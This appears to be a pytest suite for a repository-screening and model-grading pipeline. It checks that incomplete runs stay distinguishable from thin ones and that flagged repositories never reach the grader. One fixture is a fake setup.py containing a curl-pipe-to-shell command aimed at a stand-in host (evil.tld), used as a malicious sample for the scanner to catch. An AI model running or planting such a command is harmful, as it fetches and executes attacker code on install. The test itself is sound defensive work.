"""The seam between stages, which is where an incomplete run turns into a lie.

Every test here is about one claim: a run that could not finish must be
distinguishable from a run that finished and found little.
"""

from __future__ import annotations

import re

import pytest

from gitseed.collect.search import Candidate, CollectResult
from gitseed.evidence import ClaimBasis
from gitseed.grade.types import GradeResult
from gitseed.pipeline.run import (
    FileFetchError,
    PipelineResult,
    Reviewed,
    _digest,
    ranked,
    run,
)
from gitseed.screen.signals import HIGH, Signal

MODEL_DIGEST_BYTE_CAP = 23_000
CLEAN = [("main.py", "def add(a, b):\n    return a + b\n")]
MALICIOUS = [("setup.py", "import os\nos.system('curl http://evil.tld/x | sh')\n")]


def candidate(repo: str) -> Candidate:
    owner = repo.split("/")[0]
    return Candidate(repo=repo, owner=owner, html_url=f"https://github.com/{repo}",
                     stars=10, pushed_at="2026-07-01T00:00:00Z")


def grade(idea: int = 7, skill: int = 6) -> GradeResult:
    return GradeResult(idea=idea, skill=skill, description="d", model="m",
                       temperature=0.0, prompt_version="v1")


class Grader:
    def __init__(self, result: GradeResult | None = None, raises: Exception | None = None) -> None:
        self._result = result or grade()
        self._raises = raises
        self.seen: list[str] = []

    def evaluate(self, digest: str) -> GradeResult:
        self.seen.append(digest)
        if self._raises is not None:
            raise self._raises
        return self._result

    def flags_malicious(self, digest: str) -> bool:
        return False


def files_for(mapping: dict[str, list[tuple[str, str]]]):
    def fetch(c: Candidate):
        return mapping[c.repo]
    return fetch


# --- the happy path only proves the plumbing ----------------------------------


def test_a_clean_candidate_is_screened_then_graded() -> None:
    grader = Grader()
    result = run(
        CollectResult(candidates=[candidate("a/one")]),
        fetch_files=files_for({"a/one": CLEAN}),
        grader=grader,
    )
    assert result.complete
    assert len(result.reviewed) == 1
    entry = result.reviewed[0]
    assert entry.grade is not None and entry.withheld is None
    assert entry.score == 13


def test_the_grader_is_not_told_how_popular_the_repository_is() -> None:
    """A grader told a repository has 40k stars is being told the answer."""
    grader = Grader()
    run(CollectResult(candidates=[candidate("a/one")]),
        fetch_files=files_for({"a/one": CLEAN}), grader=grader)
    digest = grader.seen[0]
    assert "10" not in digest.replace("a/one", "")
    assert "2026-07-01" not in digest
    assert "main.py" in digest


def test_large_model_digest_is_bounded_and_declares_omissions() -> None:
    # Given: selected source is valid for screening but much too large for a model prompt.
    files = [(f"src/module_{number}.py", "x" * 4_000) for number in range(20)]

    # When: the model-only digest is made.
    digest = _digest(candidate("a/large"), files)

    # Then: its evidence budget and every omitted byte are explicit.
    assert len(digest.encode("utf-8")) <= MODEL_DIGEST_BYTE_CAP
    assert "model-evidence: selected_files=20 sampled_files=16" in digest
    assert "omitted_bytes=" in digest
    assert "shortened=true" in digest


def test_bounded_digest_samples_evenly_and_is_utf8_safe() -> None:
    # Given: seventeen large UTF-8 files, so one deterministic sample must be omitted.
    files = [(f"src/{number:02d}.py", f"file-{number}:" + "한" * 4_000) for number in range(17)]

    # When: the grading evidence is reduced.
    digest = _digest(candidate("a/even"), files)

    # Then: it contains the fixed evenly spaced sample, including both endpoints.
    expected = tuple((index * 16) // 15 for index in range(16))
    assert len(digest.encode("utf-8")) <= MODEL_DIGEST_BYTE_CAP
    assert "sampled_files=16" in digest
    for index in expected:
        assert f"--- src/{index:02d}.py" in digest
    assert "--- src/15.py" not in digest
    assert "shortened=true" in digest
    assert digest.encode("utf-8").decode("utf-8") == digest


def test_bounded_digest_accounting_counts_actual_utf8_prefix_bytes() -> None:
    # Given: a multibyte source forces every equal byte share onto a UTF-8 boundary.
    files = [(f"src/{number:02d}.py", "한" * 4_000) for number in range(17)]

    # When: bounded evidence is rendered.
    digest = _digest(candidate("a/accounting"), files)

    # Then: per-file and aggregate included-byte facts describe text actually present.
    sections = re.findall(
        r"^--- [^\n]+ included=(\d+) shortened=(?:true|false)\]\n(.*?)(?=\n--- |\nmodel-evidence:)",
        digest,
        flags=re.MULTILINE | re.DOTALL,
    )
    actual_sizes = [len(text.encode("utf-8")) for _, text in sections]
    assert [int(size) for size, _ in sections] == actual_sizes
    accounting = re.search(r"included_bytes=(\d+)", digest)
    assert accounting is not None
    assert int(accounting.group(1)) == sum(actual_sizes)


def test_small_model_digest_preserves_all_evidence() -> None:
    # Given: all selected source and structure fit comfortably inside the model budget.
    files = [("src/한글.py", "print('안녕')\n"), ("README.md", "small project\n")]

    # When: the model digest is built.
    digest = _digest(candidate("a/small"), files)

    # Then: no source byte is silently removed and the zero omission is recorded.
    assert "src/한글.py" in digest
    assert "print('안녕')\n" in digest
    assert "README.md" in digest
    assert "small project\n" in digest
    assert "model-evidence: selected_files=2 sampled_files=2" in digest
    assert "omitted_bytes=0" in digest
    assert "shortened=true" not in digest


def test_screening_receives_all_files_before_grading_receives_a_bounded_digest(monkeypatch) -> None:
    # Given: screening gets a large selected file set and the model gets its own representation.
    files = [(f"src/module_{number}.py", "x" * 4_000) for number in range(20)]
    scanned: list[tuple[tuple[str, str], ...]] = []

    def scan_spy(received):
        scanned.append(tuple(received))
        return []

    monkeypatch.setattr("gitseed.pipeline.run.scan_files", scan_spy)
    grader = Grader()

    # When: the candidate traverses the pipeline.
    result = run(
        CollectResult(candidates=[candidate("a/separate")]),
        fetch_files=files_for({"a/separate": files}),
        grader=grader,
    )

    # Then: scanner coverage is untouched while grading receives bounded evidence only.
    assert scanned == [tuple(files)]
    assert len(grader.seen) == 1
    assert len(grader.seen[0].encode("utf-8")) <= MODEL_DIGEST_BYTE_CAP
    assert result.reviewed[0].severity == "none"
    assert result.reviewed[0].screened_files == tuple(path for path, _ in files)


def test_oversized_model_evidence_structure_is_an_incomplete_candidate() -> None:
    # Given: a required repository path alone cannot fit inside declared model evidence.
    files = [("src/" + "p" * MODEL_DIGEST_BYTE_CAP, "x")]
    grader = Grader()

    # When: the pipeline reaches its grading boundary.
    result = run(
        CollectResult(candidates=[candidate("a/structural")]),
        fetch_files=files_for({"a/structural": files}),
        grader=grader,
    )

    # Then: no partial structural evidence or grade is produced.
    assert grader.seen == []
    assert result.complete is False
    assert "model grading input structure exceeds 23000 UTF-8 bytes" in " ".join(result.incomplete_because)


# --- an incomplete run must not look like a thin one --------------------------


def test_a_truncated_collection_makes_the_whole_run_incomplete() -> None:
    result = run(
        CollectResult(candidates=[candidate("a/one")], complete=False,
                      stopped_because="rate limit"),
        fetch_files=files_for({"a/one": CLEAN}),
        grader=Grader(),
    )
    assert result.complete is False
    assert "rate limit" in " ".join(result.incomplete_because)


def test_a_complete_run_that_found_nothing_is_still_complete() -> None:
    """The distinction the whole module exists for."""
    result = run(CollectResult(candidates=[]), fetch_files=files_for({}), grader=Grader())
    assert result.reviewed == ()
    assert result.complete is True
    assert result.incomplete_because == ()


def test_unreadable_files_do_not_end_the_run_but_are_recorded() -> None:
    def fetch(c: Candidate):
        if c.repo == "a/two":
            raise OSError("404")
        return CLEAN

    result = run(
        CollectResult(candidates=[candidate("a/one"), candidate("a/two"), candidate("a/three")]),
        fetch_files=fetch,
        grader=Grader(),
    )
    assert len(result.reviewed) == 3, "one bad repository discarded the others"
    assert result.complete is False
    assert "a/two" in " ".join(result.incomplete_because)
    graded = [e for e in result.reviewed if e.grade is not None]
    assert len(graded) == 2


def test_a_failing_grader_is_recorded_against_that_candidate_only() -> None:
    class Flaky(Grader):
        def evaluate(self, digest: str) -> GradeResult:
            self.seen.append(digest)
            if "a/two" in digest:
                raise RuntimeError("model refused")
            return grade()

    result = run(
        CollectResult(candidates=[candidate("a/one"), candidate("a/two")]),
        fetch_files=files_for({"a/one": CLEAN, "a/two": CLEAN}),
        grader=Flaky(),
    )
    assert result.complete is False
    failed = next(e for e in result.reviewed if e.candidate.repo == "a/two")
    assert failed.grade is None and "model refused" in (failed.withheld or "")
    assert next(e for e in result.reviewed if e.candidate.repo == "a/one").grade is not None


def test_a_grading_timeout_is_reported_and_makes_the_run_incomplete() -> None:
    # Given: the local model exceeds its configured request deadline.
    result = run(
        CollectResult(candidates=[candidate("a/slow")]),
        fetch_files=files_for({"a/slow": CLEAN}),
        grader=Grader(raises=TimeoutError("timed out")),
    )
    # When: the pipeline handles that model failure.
    entry = result.reviewed[0]
    # Then: the candidate and the run both retain the timeout failure.
    assert result.complete is False
    assert "grading failed (timed out)" in " ".join(result.incomplete_because)
    assert entry.grade is None and entry.withheld == "grading failed: timed out"


# --- screening decides before a model is ever asked ---------------------------


def test_a_high_severity_candidate_never_reaches_the_grader() -> None:
    """A model that comes back enthusiastic is an argument to override a signal."""
    grader = Grader()
    result = run(
        CollectResult(candidates=[candidate("a/bad")]),
        fetch_files=files_for({"a/bad": MALICIOUS}),
        grader=grader,
    )
    assert grader.seen == []
    entry = result.reviewed[0]
    assert entry.grade is None
    assert entry.severity == "high"
    assert "screening found" in (entry.withheld or "")


def test_a_model_security_claim_is_unverified_not_a_finding(monkeypatch) -> None:
    # Given: a model-originated security claim is present beside readable source.
    model_claim = Signal("model-warning", HIGH, "main.py", 1, "suspicious", ClaimBasis.MODEL)
    monkeypatch.setattr("gitseed.pipeline.run.scan_files", lambda _: [model_claim])

    # When: the pipeline screens and grades the candidate.
    result = run(
        CollectResult(candidates=[candidate("a/model-claim")]),
        fetch_files=files_for({"a/model-claim": CLEAN}),
        grader=Grader(),
    )

    # Then: the model claim remains inspectable but cannot manufacture a finding.
    entry = result.reviewed[0]
    assert entry.findings == ()
    assert entry.unverified == (model_claim,)
    assert entry.severity == "none"
    assert entry.withheld is None


def test_unreadable_source_is_absent_not_a_clean_security_claim() -> None:
    # Given: the same candidate either yields readable clean source or fails to read.
    clean = run(
        CollectResult(candidates=[candidate("a/clean")]),
        fetch_files=files_for({"a/clean": CLEAN}),
        grader=Grader(),
    ).reviewed[0]
    absent = run(
        CollectResult(candidates=[candidate("a/absent")]),
        fetch_files=lambda _: (_ for _ in ()).throw(OSError("offline")),
        grader=Grader(),
    ).reviewed[0]

    # When/Then: zero findings means different things with and without evidence.
    assert clean.findings == absent.findings == ()
    assert clean.screening_basis is ClaimBasis.DETERMINISTIC
    assert clean.screened_files == ("main.py",)
    assert absent.screening_basis is ClaimBasis.ABSENT
    assert absent.screened_files == ()


def test_a_forbidden_resource_is_absent_not_a_clean_or_false_result() -> None:
    """Issue #6: the branch a real 403-forbidden response drives.

    `GitHubClient.fetch_files` raises `FileFetchError`, not a bare exception, for
    a forbidden resource -- a distinct branch from the generic-exception path
    covered by `test_unreadable_source_is_absent_not_a_clean_security_claim`
    above. Mutating this branch's `severity` from `"unknown"` to `"none"` (a
    clean scan) passed the full suite before this test existed: nothing checked
    it. A forbidden resource must read the same as any other absent evidence --
    not as "screened and found nothing" and not as a falsy-but-present score.
    """

    def forbidden(_: Candidate):
        raise FileFetchError("GitHub access is forbidden; waiting will not help")

    result = run(
        CollectResult(candidates=[candidate("torvalds/linux")]),
        fetch_files=forbidden,
        grader=Grader(),
    )
    entry = result.reviewed[0]
    assert entry.severity == "unknown"
    assert entry.screening_basis is ClaimBasis.ABSENT
    assert entry.score is None
    assert entry.withheld is not None and "forbidden" in entry.withheld
    assert result.complete is False


def test_a_blocked_candidate_does_not_make_the_run_incomplete() -> None:
    """Screening rejecting something is the pipeline working, not failing."""
    result = run(
        CollectResult(candidates=[candidate("a/bad")]),
        fetch_files=files_for({"a/bad": MALICIOUS}),
        grader=Grader(),
    )
    assert result.complete is True


def test_a_blocked_candidate_is_kept_in_the_output() -> None:
    """Dropping it silently would let the same repository return tomorrow."""
    result = run(
        CollectResult(candidates=[candidate("a/bad")]),
        fetch_files=files_for({"a/bad": MALICIOUS}),
        grader=Grader(),
    )
    assert [e.candidate.repo for e in result.reviewed] == ["a/bad"]
    assert result.reviewed[0].signals != []


# --- ranking ------------------------------------------------------------------


def test_ranked_puts_the_highest_score_first() -> None:
    class Varying(Grader):
        def evaluate(self, digest: str) -> GradeResult:
            return grade(9, 9) if "a/high" in digest else grade(2, 2)

    result = run(
        CollectResult(candidates=[candidate("a/low"), candidate("a/high")]),
        fetch_files=files_for({"a/low": CLEAN, "a/high": CLEAN}),
        grader=Varying(),
    )
    assert [e.candidate.repo for e in ranked(result)] == ["a/high", "a/low"]


def test_an_ungraded_entry_sorts_last_but_is_not_dropped() -> None:
    result = run(
        CollectResult(candidates=[candidate("a/bad"), candidate("a/ok")]),
        fetch_files=files_for({"a/bad": MALICIOUS, "a/ok": CLEAN}),
        grader=Grader(),
    )
    order = [e.candidate.repo for e in ranked(result)]
    assert order == ["a/ok", "a/bad"]


def test_an_ungraded_entry_has_no_score_at_all() -> None:
    """Not a sentinel below the range — no number.

    A sentinel is chosen against the range it sits under. -1 and 0 are both safe
    while `GradeResult` enforces 1..10, and both stop being safe the moment that
    range opens downward, silently. `None` cannot be compared by accident.
    """
    ungraded = Reviewed(candidate=candidate("a/x"), signals=[], severity="none", grade=None)
    assert ungraded.score is None
    assert Reviewed(
        candidate=candidate("a/y"), signals=[], severity="none", grade=grade(1, 1)
    ).score == 2


def test_the_grade_range_that_makes_a_sentinel_unnecessary_is_enforced() -> None:
    with pytest.raises(ValueError):
        grade(0, 0)


def test_ranking_is_total_so_two_runs_agree() -> None:
    class Same(Grader):
        def evaluate(self, digest: str) -> GradeResult:
            return grade(5, 5)

    collected = CollectResult(candidates=[candidate("a/b"), candidate("a/a"), candidate("a/c")])
    first = ranked(run(collected, fetch_files=files_for({"a/a": CLEAN, "a/b": CLEAN, "a/c": CLEAN}), grader=Same()))
    second = ranked(run(collected, fetch_files=files_for({"a/a": CLEAN, "a/b": CLEAN, "a/c": CLEAN}), grader=Same()))
    assert [e.candidate.repo for e in first] == [e.candidate.repo for e in second]
    assert [e.candidate.repo for e in first] == ["a/a", "a/b", "a/c"]


def test_with_incomplete_keeps_every_reason_in_order() -> None:
    result = PipelineResult()
    result = result.with_incomplete("first")
    result = result.with_incomplete("second")
    assert result.complete is False
    assert result.incomplete_because == ("first", "second")
